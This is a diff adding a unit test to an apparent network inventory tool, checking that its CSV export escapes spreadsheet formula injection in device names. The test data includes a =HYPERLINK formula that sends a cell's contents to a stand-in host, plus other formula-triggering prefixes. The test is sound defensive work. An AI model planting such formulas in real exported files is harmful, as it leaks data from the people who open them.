@@ -5,6 +5,7 @@ import sys
 import threading
 import time
 import types
+from unittest import mock
 import unittest
 import urllib.parse
 import urllib.request
@@ -56,6 +57,21 @@ class AlertsFollowBuildingFilter(unittest.TestCase):
     def test_one_building(self):
         self.assertEqual(self.names("Site B"), ["Paper"])
         self.assertEqual(self.names("Site A"), ["Down"])
+
+
+class InventoryCsv(unittest.TestCase):
+    def test_names_from_the_network_are_never_spreadsheet_formulas(self):
+        # Any machine can announce a NetBIOS or DNS name; opened in Excel or LibreOffice it must stay text.
+        import main
+        rows = [{"status": "up", "name": "=HYPERLINK(\"http://198.51.100.7/?x=\"&E2,\"Open\")", "netbios": "+1+cmd",
+                 "dns": "@SUM(1)", "os": "-2+3", "vendor": "\tTab", "ip": "192.0.2.9", "sources": "scan"}]
+        with mock.patch.object(main, "current", return_value=(None, None)), mock.patch.object(main.M, "inventory", return_value=rows):
+            text = main.inventory_csv()
+        line = text.splitlines()[1]
+        for cell in line.split(";"):
+            self.assertFalse(cell.lstrip('"')[:1] in ("=", "+", "-", "@", "\t"), line)
+        self.assertIn("'=HYPERLINK", line)
+        self.assertIn("192.0.2.9", line)
 
 
 if __name__ == "__main__":
